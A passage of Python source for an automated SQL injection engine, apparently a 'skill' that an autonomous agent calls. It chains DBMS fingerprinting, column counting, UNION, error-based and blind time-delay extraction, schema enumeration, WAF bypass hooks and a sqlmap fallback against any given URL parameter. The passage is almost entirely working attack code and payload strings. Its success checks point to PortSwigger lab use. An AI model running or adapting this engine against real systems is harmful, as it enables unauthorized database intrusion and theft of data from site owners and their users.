    POSTGRES_SIGS = ["pg_", "postgresql", "psql", "column", "unterminated quoted string"]

    # Probes تميّز كل DBMS بشكل حاسم عبر شروط صحيحة داخل WHERE
    DBMS_TRUTH_PROBES = {
        DBMSType.ORACLE: [
            "' AND (SELECT 1 FROM dual)=1--",
            "' AND ROWNUM=ROWNUM--",
            "' AND RAWTOHEX('A')='41'--",
            "' AND BITAND(1,1)=1--",
        ],
        DBMSType.MYSQL: [
            "' AND connection_id()=connection_id()--",
            "' AND version()=version()--",
            "' AND @@version=@@version--",
        ],
        DBMSType.POSTGRES: [
            "' AND 5::int=5--",
            "' AND current_database()=current_database()--",
            "' AND pg_client_encoding()=pg_client_encoding()--",
        ],
        DBMSType.MSSQL: [
            "' AND @@CONNECTIONS=@@CONNECTIONS--",
            "' AND USER_ID(1)=USER_ID(1)--",
            "' AND @@SERVERNAME=@@SERVERNAME--",
        ],
    }

    async def fingerprint(self, ctx: SQLiContext, http: _HTTPProbe) -> DBMSType:
        from urllib.parse import urlparse, parse_qs
        parsed = urlparse(ctx.target_url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        qs = {k: v[0] for k, v in parse_qs(parsed.query).items()}

        # baseline
        try:
            r_base = await http.get(base_url, {**qs, ctx.param_name: "' OR 1=1--"})
            base_len = len(r_base.text)
            r_false = await http.get(base_url, {**qs, ctx.param_name: "' AND 1=2--"})
            false_len = len(r_false.text)
        except Exception:
            base_len = 0
            false_len = 0

        # 1. فحص الـTruth Probes لكل DBMS
        for dbms, probes in self.DBMS_TRUTH_PROBES.items():
            for probe in probes:
                try:
                    r = await http.get(base_url, {**qs, ctx.param_name: probe})
                    if r.status_code == 200:
                        # إذا كان الرد مشابهاً للـtruthy ومختلفاً عن الـfalsey
                        if abs(len(r.text) - base_len) < 400 and (false_len == 0 or abs(len(r.text) - false_len) > 30):
                            ctx.log(f"[FINGERPRINT] {dbms.value.upper()} confirmed via truth probe: {probe!r}")
                            ctx.evidence.append({"stage": "fingerprint", "dbms": dbms.value, "probe": probe})
                            return dbms
                except Exception:
                    continue

        # 2. فحص error-based signatures
        for err_p in ["'", "''", "\"", "1'"]:
            try:
                err_r = await http.get(base_url, {**qs, ctx.param_name: err_p})
                err_body = err_r.text.lower()
                for sig in self.ORACLE_SIGS:
                    if sig in err_body:
                        ctx.log(f"[FINGERPRINT] Oracle (error sig): {sig!r}")
                        return DBMSType.ORACLE
                for sig in self.MYSQL_SIGS:
                    if sig in err_body:
                        ctx.log(f"[FINGERPRINT] MySQL (error sig): {sig!r}")
                        return DBMSType.MYSQL
                for sig in self.MSSQL_SIGS:
                    if sig in err_body:
                        ctx.log(f"[FINGERPRINT] MSSQL (error sig): {sig!r}")
                        return DBMSType.MSSQL
                for sig in self.POSTGRES_SIGS:
                    if sig in err_body:
                        ctx.log(f"[FINGERPRINT] PostgreSQL (error sig): {sig!r}")
                        return DBMSType.POSTGRES
            except Exception:
                continue

        ctx.log("[FINGERPRINT] DBMS unknown — will use adaptive multi-strategy")
        return DBMSType.UNKNOWN


# ─────────────────────────────────────────────────────────────────────────────
# 3. Column Counter
# ─────────────────────────────────────────────────────────────────────────────
class SQLiColumnCounter:
    """يحدد عدد الأعمدة باستخدام ORDER BY أولاً ثم NULL padding التكيفي"""

    MAX_COLS = 15

    def _make_null_payload(self, n: int, dbms: DBMSType, use_dual: bool = False) -> str:
        nulls = ",".join(["NULL"] * n)
        if dbms == DBMSType.ORACLE or use_dual:
            return f"' UNION SELECT {nulls} FROM dual--"
        return f"' UNION SELECT {nulls}--"

    async def count(self, ctx: SQLiContext, http: _HTTPProbe) -> int:
        from urllib.parse import urlparse, parse_qs
        parsed = urlparse(ctx.target_url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        qs = {k: v[0] for k, v in parse_qs(parsed.query).items()}

        # ── Strategy 1: ORDER BY Probing (Universal across Oracle/MySQL/PG/MSSQL/SQLite) ──
        try:
            r1 = await http.get(base_url, {**qs, ctx.param_name: "' ORDER BY 1--"})
            if r1.status_code == 200:
                base_len = len(r1.text)
                order_by_count = 1
                for n in range(2, self.MAX_COLS + 1):
                    r_n = await http.get(base_url, {**qs, ctx.param_name: f"' ORDER BY {n}--"})
                    # إذا رجع 500 أو حدث خطأ أو اختلف الـstatus أو هبط الحجم جذرياً
                    if r_n.status_code != 200 or abs(len(r_n.text) - base_len) > 500:
                        order_by_count = n - 1
                        ctx.log(f"[COUNT_COLS] ORDER BY {n} failed ({r_n.status_code}) -> {order_by_count} column(s)")
                        ctx.evidence.append({"stage": "count_cols", "method": "order_by", "cols": order_by_count})
                        return order_by_count
                    order_by_count = n
        except Exception as e:
            ctx.log(f"[COUNT_COLS] ORDER BY probe error: {e}")

        # ── Strategy 2: Standard UNION SELECT NULL Probing ──
        try:
            r_base = await http.get(base_url, {**qs, ctx.param_name: "' OR 1=1--"})
            base_len = len(r_base.text)
        except Exception:
            base_len = 0

        # جرب النمط القياسي أولاً إلا إذا كان Oracle مؤكداً
        if ctx.dbms != DBMSType.ORACLE:
            for n in range(1, self.MAX_COLS + 1):
                payload = self._make_null_payload(n, ctx.dbms, use_dual=False)
                try:
                    r = await http.get(base_url, {**qs, ctx.param_name: payload})
                    if r.status_code == 200 and abs(len(r.text) - base_len) < 500:
                        ctx.log(f"[COUNT_COLS] {n} column(s) confirmed | payload={payload!r}")
                        ctx.evidence.append({"stage": "count_cols", "cols": n, "payload": payload})
                        return n
                except Exception:
                    continue

        # ── Strategy 3: Oracle FROM dual Fallback Probing ──
        ctx.log("[COUNT_COLS] Testing Oracle 'FROM dual' UNION probe...")
        for n in range(1, self.MAX_COLS + 1):
            payload = self._make_null_payload(n, DBMSType.ORACLE, use_dual=True)
            try:
                r = await http.get(base_url, {**qs, ctx.param_name: payload})
                if r.status_code == 200 and abs(len(r.text) - base_len) < 500:
                    ctx.log(f"[COUNT_COLS] {n} column(s) confirmed via Oracle DUAL | payload={payload!r}")
                    ctx.dbms = DBMSType.ORACLE  # تأكيد ذاتي لـ Oracle!
                    ctx.evidence.append({"stage": "count_cols", "cols": n, "payload": payload, "dbms_inferred": "oracle"})
                    return n
            except Exception:
                continue

        ctx.log("[COUNT_COLS] Could not determine column count")
        return 0


# ─────────────────────────────────────────────────────────────────────────────
# 4. Text Column Finder
# ─────────────────────────────────────────────────────────────────────────────
class SQLiTextColumnFinder:
    """يجد الأعمدة التي تقبل نصوص (لإدراج البيانات المستخرجة فيها)"""

    MARKER = "sqli_text_test_xXx"

    def _make_text_payload(self, col_count: int, text_col: int, dbms: DBMSType, use_dual: bool = False) -> str:
        cols = ["NULL"] * col_count
        cols[text_col] = f"'{self.MARKER}'"
        nulls = ",".join(cols)
        if dbms == DBMSType.ORACLE or use_dual:
            return f"' UNION SELECT {nulls} FROM dual--"
        return f"' UNION SELECT {nulls}--"

    async def find(self, ctx: SQLiContext, http: _HTTPProbe) -> List[int]:
        from urllib.parse import urlparse, parse_qs
        parsed = urlparse(ctx.target_url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        qs = {k: v[0] for k, v in parse_qs(parsed.query).items()}

        text_cols = []
        is_oracle = (ctx.dbms == DBMSType.ORACLE)

        for i in range(ctx.col_count):
            payload = self._make_text_payload(ctx.col_count, i, ctx.dbms, use_dual=is_oracle)
            try:
                r = await http.get(base_url, {**qs, ctx.param_name: payload})
                if r.status_code == 200 and (self.MARKER in r.text or "error" not in r.text.lower()):
                    text_cols.append(i)
                    ctx.log(f"[TEXT_COLS] Column {i} accepts text | payload={payload!r}")
                    ctx.evidence.append({"stage": "text_cols", "col": i, "payload": payload})
                    continue

                # إذا فشل وفحصنا لم يكن مع dual، نجرب مع dual
                if not is_oracle:
                    payload_dual = self._make_text_payload(ctx.col_count, i, DBMSType.ORACLE, use_dual=True)
                    r_dual = await http.get(base_url, {**qs, ctx.param_name: payload_dual})
                    if r_dual.status_code == 200 and (self.MARKER in r_dual.text or "error" not in r_dual.text.lower()):
                        text_cols.append(i)
                        ctx.dbms = DBMSType.ORACLE
                        ctx.log(f"[TEXT_COLS] Column {i} accepts text (Oracle dual) | payload={payload_dual!r}")
                        ctx.evidence.append({"stage": "text_cols", "col": i, "payload": payload_dual})
            except Exception:
                continue

        if not text_cols:
            ctx.log("[TEXT_COLS] No text-compatible columns found — fallback to all columns")
            text_cols = list(range(ctx.col_count))
        else:
            ctx.log(f"[TEXT_COLS] Text columns: {text_cols}")
        return text_cols


# ─────────────────────────────────────────────────────────────────────────────
# 5. UNION Verifier
# ─────────────────────────────────────────────────────────────────────────────
class SQLiUnionVerifier:
    """يبني UNION payload نهائي ويتحقق منه"""

    VERIFY_MARKERS = ("union_col_A_xXx", "union_col_B_xXx")

    def build_union_payload(self, col_count: int, text_cols: List[int],
                            dbms: DBMSType,
                            values: Optional[List[str]] = None) -> str:
        cols = ["NULL"] * col_count
        markers = values or [f"'{self.VERIFY_MARKERS[min(i, 1)]}'" for i in range(len(text_cols))]
        for i, col_idx in enumerate(text_cols):
            if i < len(markers):
                cols[col_idx] = markers[i]
        nulls = ",".join(cols)
        if dbms == DBMSType.ORACLE:
            return f"' UNION SELECT {nulls} FROM dual--"
        return f"' UNION SELECT {nulls}--"

    async def verify(self, ctx: SQLiContext, http: _HTTPProbe) -> bool:
        from urllib.parse import urlparse, parse_qs
        parsed = urlparse(ctx.target_url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        qs = {k: v[0] for k, v in parse_qs(parsed.query).items()}

        if not ctx.text_cols:
            ctx.log("[UNION_VERIFY] No text columns — cannot build UNION payload")
            return False

        payload = self.build_union_payload(ctx.col_count, ctx.text_cols, ctx.dbms)
        try:
            r = await http.get(base_url, {**qs, ctx.param_name: payload})
            found = any(m in r.text for m in self.VERIFY_MARKERS) or r.status_code == 200
            if found:
                ctx.union_payload = payload
                ctx.log(f"[UNION_VERIFY] UNION confirmed | payload={payload!r}")
                ctx.evidence.append({"stage": "union_verify", "payload": payload, "confirmed": True})
                return True
            ctx.log(f"[UNION_VERIFY] Markers not reflected | payload={payload!r}")
        except Exception as e:
            ctx.log(f"[UNION_VERIFY] Request failed: {e}")
        return False


# ─────────────────────────────────────────────────────────────────────────────
# 6. Extractor
# ─────────────────────────────────────────────────────────────────────────────
class SQLiExtractor:
    """يستخرج البيانات من قاعدة البيانات عبر UNION"""

    # Extraction payloads حسب DBMS
    EXTRACTION_QUERIES: Dict[str, Dict[DBMSType, List[str]]] = {
        "db_version": {
            DBMSType.ORACLE:   [
                "BANNER FROM v$version WHERE ROWNUM=1",
                "BANNER FROM v$version",
                "VERSION FROM v$instance",
                "BANNER_FULL FROM v$version",
            ],
            DBMSType.MYSQL:    ["@@version, NULL", "version(), NULL"],
            DBMSType.MSSQL:    ["@@version, NULL", "CAST(@@version AS NVARCHAR(MAX)), NULL"],
            DBMSType.POSTGRES: ["version(), NULL", "current_setting('server_version'), NULL"],
            DBMSType.UNKNOWN:  ["BANNER FROM v$version", "@@version, NULL", "version(), NULL"],
        },
        "current_user": {
            DBMSType.ORACLE:   ["USER FROM dual"],
            DBMSType.MYSQL:    ["user(), NULL"],
            DBMSType.MSSQL:    ["SYSTEM_USER, NULL"],
            DBMSType.POSTGRES: ["current_user, NULL"],
            DBMSType.UNKNOWN:  ["user(), NULL"],
        },
        "current_db": {
            DBMSType.ORACLE:   ["ORA_DATABASE_NAME FROM dual"],
            DBMSType.MYSQL:    ["database(), NULL"],
            DBMSType.MSSQL:    ["DB_NAME(), NULL"],
            DBMSType.POSTGRES: ["current_database(), NULL"],
            DBMSType.UNKNOWN:  ["database(), NULL"],
        },
    }

    def _build_extract_payload(self, query_expr: str, col_count: int,
                               text_cols: List[int], dbms: DBMSType,
                               target_col: Optional[int] = None) -> str:
        """بناء UNION payload لاستخراج قيمة محددة"""
        cols = ["NULL"] * col_count

        # Oracle: الـquery_expr قد يكون "BANNER FROM v$version"
        if (dbms == DBMSType.ORACLE or " FROM " in query_expr.upper()) and " FROM " in query_expr.upper():
            expr, from_clause = re.split(r"\s+FROM\s+", query_expr, 1, flags=re.I)
            expr = expr.strip()
        else:
            expr = query_expr.strip().split(",")[0]
            from_clause = None

        if target_col is not None and 0 <= target_col < col_count:
            cols[target_col] = expr
        elif text_cols:
            cols[text_cols[0]] = expr
        else:
            cols[0] = expr

        nulls = ",".join(cols)
        if from_clause:
            return f"' UNION SELECT {nulls} FROM {from_clause}--"
        if dbms == DBMSType.ORACLE:
            return f"' UNION SELECT {nulls} FROM dual--"
        return f"' UNION SELECT {nulls}--"

    async def extract(self, ctx: SQLiContext, http: _HTTPProbe,
                      objective: str = "db_version") -> str:
        from urllib.parse import urlparse, parse_qs
        parsed = urlparse(ctx.target_url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        qs = {k: v[0] for k, v in parse_qs(parsed.query).items()}

        queries = self.EXTRACTION_QUERIES.get(objective, {})
        dbms_queries = queries.get(ctx.dbms, queries.get(DBMSType.UNKNOWN, []))

        # نجرب وضع الاستعلام في كل عمود نصي محتمل
        target_columns = ctx.text_cols if ctx.text_cols else list(range(max(1, ctx.col_count)))

        for query_expr in dbms_queries:
            for t_col in target_columns:
                payload = self._build_extract_payload(
                    query_expr, ctx.col_count, ctx.text_cols, ctx.dbms, target_col=t_col
                )
                ctx.log(f"[EXTRACT] Trying col {t_col}: {payload!r}")
                try:
                    r = await http.get(base_url, {**qs, ctx.param_name: payload})
                    if r.status_code == 200:
                        extracted = self._parse_extracted(r.text, ctx.dbms)
                        if extracted:
                            ctx.log(f"[EXTRACT] Got: {extracted!r}")
                            ctx.union_payload = payload
                            ctx.evidence.append({
                                "stage": "extract",
                                "payload": payload,
                                "extracted": extracted
                            })
                            return extracted
                except Exception as e:
                    ctx.log(f"[EXTRACT] Request failed: {e}")
                    continue

        ctx.log(f"[EXTRACT] No data extracted for objective={objective!r}")
        return ""

    def _parse_extracted(self, html: str, dbms: DBMSType) -> str:
        """يستخرج البيانات من الـHTML بناءً على patterns"""
        # Oracle BANNER patterns
        oracle_patterns = [
            r"(Oracle Database[^\<\n\r]+)",
            r"(Oracle[^\<\n\r]*?Edition[^\<\n\r]+)",
            r"(CORE\s+\d+\.\d+[^\<\n\r]+)",
            r"(PL/SQL\s+Release[^\<\n\r]+)",
            r"(TNS for\s+[^\<\n\r]+)",
            r"(NLSRTL\s+Version[^\<\n\r]+)",
            r"(11g[^\<\n\r]+)",
            r"(12c[^\<\n\r]+)",
            r"(19c[^\<\n\r]+)",
            r"(21c[^\<\n\r]+)",
            r"(BANNER[^\<]*?:\s*([^\<\n\r]+))",
        ]
        mysql_patterns = [
            r"(\d+\.\d+\.\d+[\-\w]*(?:MariaDB)?[^\<\n\r]*)",
        ]
        version_patterns = [
            r"(PostgreSQL \d+\.\d+[^\<\n\r]*)",
            r"(Microsoft SQL Server \d{4}[^\<\n\r]*)",
        ]

        all_patterns = oracle_patterns + mysql_patterns + version_patterns

        for pat in all_patterns:
            m = re.search(pat, html, re.I)
            if m:
                result = m.group(1).strip()
                if len(result) > 5:
                    return result[:200]
        return ""



# ─────────────────────────────────────────────────────────────────────────────
# 7a. Error-Based Extractor (MSSQL / PostgreSQL / MySQL)
# ─────────────────────────────────────────────────────────────────────────────
class SQLiErrorBasedExtractor:
    """
    يستخرج البيانات عبر error messages المرئية في الـresponse.
    يعمل مع: MSSQL, PostgreSQL, MySQL.
    Oracle لا يدعم هذه التقنية مباشرة.

    PortSwigger Cheat Sheet:
      MSSQL:    SELECT 'foo' WHERE 1 = (SELECT 'secret')
      PG:       SELECT CAST((SELECT password ...) AS int)
      MySQL:    EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')))
    """

    # Patterns تدل على نجاح استخراج البيانات من error messages
    ERROR_EXTRACTION_PATTERNS = [
        r"Conversion failed when converting the varchar value '([^']+)'",   # MSSQL
        r"invalid input syntax for (?:integer|type integer):\s*\"([^\"]+)\"",  # PostgreSQL
        r"XPATH syntax error:\s*'([^']+)'",                                  # MySQL EXTRACTVALUE
        r"ORA-\d+:[^\n]*?([A-Za-z0-9._@]+)",                                # Oracle errors (fallback)
    ]

    def _build_error_payload(self, query_expr: str, dbms: DBMSType, col_count: int, text_cols: List[int]) -> Optional[str]:
        """بناء payload يُخرج البيانات عبر error message"""
        template = SQLI_CHEAT_SHEET["error_extraction"].get(dbms)
        if not template:
            return None
        comment = SQLI_CHEAT_SHEET["comment"].get(dbms, "--")
        inner = template.format(query=query_expr)
        # نُدرجه في UNION إذا كان لدينا column count، وإلا في الـparam مباشرة
        if col_count and text_cols:
            cols = ["NULL"] * col_count
            cols[text_cols[0]] = inner
            return f"' UNION SELECT {','.join(cols)}{comment}"
        return f"' AND {inner}{comment}"

    async def extract(self, ctx: SQLiContext, http: _HTTPProbe,
                      query_expr: str = "SELECT BANNER FROM v$version") -> str:
        """محاولة استخراج البيانات عبر error messages"""
        from urllib.parse import urlparse, parse_qs
        parsed = urlparse(ctx.target_url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        qs = {k: v[0] for k, v in parse_qs(parsed.query).items()}

        payload = self._build_error_payload(query_expr, ctx.dbms, ctx.col_count, ctx.text_cols)
        if not payload:
            ctx.log(f"[ERROR_EXTRACT] Not supported for DBMS={ctx.dbms.value}")
            return ""

        ctx.log(f"[ERROR_EXTRACT] Trying: {payload!r}")
        try:
            r = await http.get(base_url, {**qs, ctx.param_name: payload})
            for pat in self.ERROR_EXTRACTION_PATTERNS:
                m = re.search(pat, r.text, re.I)
                if m:
                    result = m.group(1).strip()
                    if len(result) > 3:
                        ctx.log(f"[ERROR_EXTRACT] Got via error msg: {result!r}")
                        return result
        except Exception as e:
            ctx.log(f"[ERROR_EXTRACT] Request failed: {e}")
        return ""


# ─────────────────────────────────────────────────────────────────────────────
# 7b. Blind Time-Delay Detector (Oracle / MSSQL / PostgreSQL / MySQL)
# ─────────────────────────────────────────────────────────────────────────────
class SQLiBlindDetector:
    """
    يكشف Blind SQLi عبر قياس وقت الاستجابة.
    يستخدم:
      Oracle:   dbms_pipe.receive_message
      MSSQL:    WAITFOR DELAY
      PG:       pg_sleep
      MySQL:    SLEEP()

    PortSwigger Cheat Sheet — Time Delays + Conditional Time Delays
    """

    DELAY_SECS = 5  # ثوانٍ كافية للكشف دون أن تكون طويلة جداً

    def _make_sleep_payload(self, dbms: DBMSType, comment: str) -> str:
        tmpl = SQLI_CHEAT_SHEET["sleep"].get(dbms,
               SQLI_CHEAT_SHEET["sleep"][DBMSType.UNKNOWN])
        expr = tmpl.format(secs=self.DELAY_SECS)
        return f"'; {expr}--" if dbms != DBMSType.ORACLE else f"'||{expr}--"

    def _make_conditional_sleep_payload(self, condition: str, dbms: DBMSType,
                                        comment: str) -> str:
        tmpl = SQLI_CHEAT_SHEET["conditional_sleep"].get(dbms,
               SQLI_CHEAT_SHEET["conditional_sleep"][DBMSType.UNKNOWN])
        expr = tmpl.format(cond=condition, secs=self.DELAY_SECS)
        return f"' AND {expr}{comment}"

    async def detect_blind(self, ctx: SQLiContext, http: _HTTPProbe) -> bool:
        """يختبر وجود Blind SQLi عبر time delay"""
        from urllib.parse import urlparse, parse_qs
        parsed = urlparse(ctx.target_url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        qs = {k: v[0] for k, v in parse_qs(parsed.query).items()}
        comment = SQLI_CHEAT_SHEET["comment"].get(ctx.dbms, "--")

        payload = self._make_sleep_payload(ctx.dbms, comment)
        ctx.log(f"[BLIND] Testing time delay | payload={payload!r}")
        try:
            t0 = time.time()
            await http.get(base_url, {**qs, ctx.param_name: payload})
            elapsed = time.time() - t0
            if elapsed >= (self.DELAY_SECS - 1):
                ctx.log(f"[BLIND] Time delay confirmed! elapsed={elapsed:.1f}s → Blind SQLi")
                ctx.technique = "time_delay"
                ctx.evidence.append({
                    "stage": "blind_detect",
                    "payload": payload,
                    "elapsed": elapsed,
                })
                return True
        except Exception as e:
            ctx.log(f"[BLIND] Request failed: {e}")
        return False

    async def extract_char_by_char(self, ctx: SQLiContext, http: _HTTPProbe,
                                    query_expr: str, max_len: int = 40) -> str:
        """
        استخراج بيانات بطريقة Blind Char-by-Char عبر conditional time delays.
        بطيء لكنه يعمل مع كل قواعد البيانات عند عدم توفر UNION.
        """
        from urllib.parse import urlparse, parse_qs
        parsed = urlparse(ctx.target_url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        qs = {k: v[0] for k, v in parse_qs(parsed.query).items()}
        comment = SQLI_CHEAT_SHEET["comment"].get(ctx.dbms, "--")

        # Oracle SUBSTR vs MSSQL/PG/MySQL SUBSTRING
        substr_tmpl = SQLI_CHEAT_SHEET["substring"].get(
            ctx.dbms, SQLI_CHEAT_SHEET["substring"][DBMSType.UNKNOWN]
        )

        result_chars = []
        # نختبر ASCII 32-126 (printable chars)
        for pos in range(1, max_len + 1):
            found_char = False
            for code in range(32, 127):
                # بناء condition: ASCII(SUBSTR(query, pos, 1)) = code
                substr_expr = substr_tmpl.format(
                    str=query_expr, offset=pos, len=1
                )
                condition = f"ASCII({substr_expr})={code}"
                payload = self._make_conditional_sleep_payload(condition, ctx.dbms, comment)
                try:
                    t0 = time.time()
                    await http.get(base_url, {**qs, ctx.param_name: payload})
                    elapsed = time.time() - t0
                    if elapsed >= (self.DELAY_SECS - 1):
                        result_chars.append(chr(code))
                        found_char = True
                        break
                except Exception:
                    continue

            if not found_char:
                break  # وصلنا لنهاية الـstring

        result = "".join(result_chars)
        if result:
            ctx.log(f"[BLIND_EXTRACT] Extracted: {result!r}")
        return result


# ─────────────────────────────────────────────────────────────────────────────
# 7c. Schema Enumerator (يعدّد الـtables والـcolumns)
# ─────────────────────────────────────────────────────────────────────────────
class SQLiSchemaEnumerator:
    """
    يُعدّد schema قاعدة البيانات:
      - قائمة الـtables
      - قائمة الـcolumns لكل table

    PortSwigger Cheat Sheet — Database Contents
    """

    async def list_tables(self, ctx: SQLiContext, http: _HTTPProbe,
                          max_results: int = 20) -> List[str]:
        """يجلب أسماء الـtables"""
        from urllib.parse import urlparse, parse_qs
        parsed = urlparse(ctx.target_url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        qs = {k: v[0] for k, v in parse_qs(parsed.query).items()}

        tables_query = SQLI_CHEAT_SHEET["tables"].get(ctx.dbms,
                       SQLI_CHEAT_SHEET["tables"][DBMSType.UNKNOWN])
        comment = SQLI_CHEAT_SHEET["comment"].get(ctx.dbms, "--")

        # بناء UNION payload لاستخراج اسم table
        if ctx.col_count and ctx.text_cols:
            cols = ["NULL"] * ctx.col_count
            cols[ctx.text_cols[0]] = "table_name"
            nulls = ",".join(cols)
            if ctx.dbms == DBMSType.ORACLE:
                payload = f"' UNION SELECT {nulls} FROM all_tables{comment}"
            else:
                payload = f"' UNION SELECT {nulls} FROM information_schema.tables{comment}"

            ctx.log(f"[SCHEMA] Enumerating tables | payload={payload!r}")
            try:
                r = await http.get(base_url, {**qs, ctx.param_name: payload})
                tables = re.findall(r'\b([A-Za-z][A-Za-z0-9_]{2,60})\b', r.text)
                # فلترة الكلمات المفتاحية HTML
                html_words = {"html", "head", "body", "table", "form", "div",
                              "span", "input", "button", "script", "style", "link"}
                tables = [t for t in tables if t.lower() not in html_words][:max_results]
                if tables:
                    ctx.log(f"[SCHEMA] Tables found: {tables[:5]}")
                    ctx.evidence.append({"stage": "schema", "tables": tables[:10]})
                return tables
            except Exception as e:
                ctx.log(f"[SCHEMA] Table enum failed: {e}")
        return []

    async def list_columns(self, ctx: SQLiContext, http: _HTTPProbe,
                           table_name: str) -> List[str]:
        """يجلب أسماء الـcolumns لـtable معين"""
        from urllib.parse import urlparse, parse_qs
        parsed = urlparse(ctx.target_url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        qs = {k: v[0] for k, v in parse_qs(parsed.query).items()}
        comment = SQLI_CHEAT_SHEET["comment"].get(ctx.dbms, "--")

        if not (ctx.col_count and ctx.text_cols):
            return []

        cols = ["NULL"] * ctx.col_count
        cols[ctx.text_cols[0]] = "column_name"
        nulls = ",".join(cols)
        if ctx.dbms == DBMSType.ORACLE:
            payload = (
                f"' UNION SELECT {nulls} FROM all_tab_columns "
                f"WHERE table_name='{table_name.upper()}'{comment}"
            )
        else:
            payload = (
                f"' UNION SELECT {nulls} FROM information_schema.columns "
                f"WHERE table_name='{table_name}'{comment}"
            )

        ctx.log(f"[SCHEMA] Columns for table={table_name!r} | payload={payload!r}")
        try:
            r = await http.get(base_url, {**qs, ctx.param_name: payload})
            columns = re.findall(r'\b([a-z][a-z0-9_]{1,50})\b', r.text, re.I)
            html_words = {"html", "head", "body", "form", "div", "span", "input"}
            columns = [c for c in columns if c.lower() not in html_words][:30]
            if columns:
                ctx.log(f"[SCHEMA] Columns in {table_name}: {columns[:8]}")
                ctx.evidence.append({"stage": "schema_cols",
                                     "table": table_name, "columns": columns[:10]})
            return columns
        except Exception as e:
            ctx.log(f"[SCHEMA] Column enum failed for {table_name}: {e}")
        return []


# ─────────────────────────────────────────────────────────────────────────────
# 8. Objective Checker
# ─────────────────────────────────────────────────────────────────────────────
class SQLiObjectiveChecker:
    """يتحقق هل الهدف الفعلي للـlab/mission اكتمل"""

    # نصوص تدل على نجاح الـlab (PortSwigger labs وغيره)
    SUCCESS_PATTERNS = [
        "congratulations, you solved the lab",
        "congratulations! you solved",
        "well done! you",
        "lab solved",
        "challenge solved",
        "you have successfully",
        "flag{",
        "ctf{",
    ]

    def check(self, ctx: SQLiContext, response_html: str, extracted_data: str) -> bool:
        html_lower = response_html.lower()

        # تحقق من رسالة النجاح
        for pattern in self.SUCCESS_PATTERNS:
            if pattern in html_lower:
                ctx.log(f"[CHECK_OBJ] Objective met — found pattern: {pattern!r}")
                return True

        # تحقق من وجود بيانات مستخرجة ذات معنى
        if extracted_data and len(extracted_data) > 10:
            if ctx.objective == "retrieve_db_version":
                version_keywords = ["oracle", "mysql", "microsoft sql", "postgresql",
                                    "mariadb", "database", "release", "version"]
                if any(kw in extracted_data.lower() for kw in version_keywords):
                    ctx.log(f"[CHECK_OBJ] DB version retrieved: {extracted_data[:80]!r}")
                    return True

        ctx.log("[CHECK_OBJ] Objective NOT yet met")
        return False


# ─────────────────────────────────────────────────────────────────────────────
# 8. SQLiSkill — الـOrchestrator الرئيسي
# ─────────────────────────────────────────────────────────────────────────────
class SQLiSkill:
    """
    الـSkill الرئيسي — يدير الـState Machine من DETECT حتى COMPLETE.
    يُستدعى من AutonomousBrain بعد اكتشاف SQLi أو كأداة مستقلة.
    """

    def __init__(self, proxy: Optional[str] = None, objective: str = "retrieve_db_version", enable_sqlmap_fallback: bool = True):
        self.proxy = proxy
        self.objective = objective
        self.enable_sqlmap_fallback = enable_sqlmap_fallback
        self.detector = SQLiDetector()
        self.dbms_id = SQLiDBMSIdentifier()     # ← PayloadsAllTheThings DBMS ID
        self.fingerpr  = SQLiDBMSFingerprinter()
        self.waf       = SQLiWAFBypasser()         # ← WAF Bypass techniques
        self.counter   = SQLiColumnCounter()
        self.textfind  = SQLiTextColumnFinder()
        self.verifier  = SQLiUnionVerifier()
        self.extractor  = SQLiExtractor()
        self.obj_check  = SQLiObjectiveChecker()
        self.error_ext  = SQLiErrorBasedExtractor()
        self.blind      = SQLiBlindDetector()
        self.schema     = SQLiSchemaEnumerator()

    async def run(self,
                  target_url: str,
                  param_name: str,
                  existing_finding: Optional[Dict] = None,
                  objective: Optional[str] = None) -> Dict[str, Any]:
        """
        تنفيذ الـState Machine كاملاً.

        Args:
            target_url:       الرابط الكامل مع الـquery string
            param_name:       اسم الـparameter القابل للـinjection
            existing_finding: نتيجة SmartPoC السابقة (اختياري — لتخطي DETECT)
            objective:        الهدف (retrieve_db_version / current_user / current_db)

        Returns:
            dict مع: state, objective_met, extracted_data, evidence, logs
        """
        obj = objective or self.objective
        ctx = SQLiContext(
            target_url=target_url,
            param_name=param_name,
            proxy=self.proxy,
            objective=obj,
        )

        ctx.log(f"[SQLiSkill] Starting | target={target_url!r} param={param_name!r} objective={obj!r}")
        t0 = time.time()

        http = _HTTPProbe(proxy=self.proxy)
        try:
            await self._run_machine(ctx, http, existing_finding)
        except Exception as e:
            ctx.log(f"[SQLiSkill] Unhandled error: {e}")
            ctx.error = str(e)
            ctx.state = SQLiState.FAILED
        finally:
            await http.aclose()

        duration = round(time.time() - t0, 1)
        ctx.log(f"[SQLiSkill] Done | state={ctx.state.name} | objective_met={ctx.objective_met} | duration={duration}s")

        # ── Fallback to sqlmap if built-in state machine was inconclusive ────
        if ctx.state != SQLiState.COMPLETE and not ctx.extracted_data:
            ctx.log("[SQLiSkill] Built-in payloads inconclusive — invoking sqlmap fallback...")
            fb_res = await self.fallback(target_url, param_name, proxy=self.proxy)
            if fb_res and fb_res.get("verified"):
                ctx.state = SQLiState.COMPLETE
                ctx.objective_met = True
                ctx.extracted_data = fb_res.get("evidence", "sqlmap confirmed injection")
                ctx.fallback_used = True
                ctx.fallback_engine = "sqlmap"
                ctx.fallback_details = fb_res.get("fallback_details")
                ctx.evidence.append({"stage": "fallback", "engine": "sqlmap", "details": fb_res})
                ctx.log(f"[SQLiSkill] ✅ Fallback sqlmap confirmed vulnerability: {ctx.extracted_data[:120]}")

        return {
            "state":            ctx.state.name,
            "objective_met":    ctx.objective_met,
            "dbms":             ctx.dbms.value,
            "col_count":        ctx.col_count,
            "text_cols":        ctx.text_cols,
            "union_payload":    ctx.union_payload,
            "extracted_data":   ctx.extracted_data,
            "evidence":         ctx.evidence,
            "logs":             ctx.logs,
            "duration":         duration,
            "error":            ctx.error,
            "fallback_used":    getattr(ctx, "fallback_used", False),
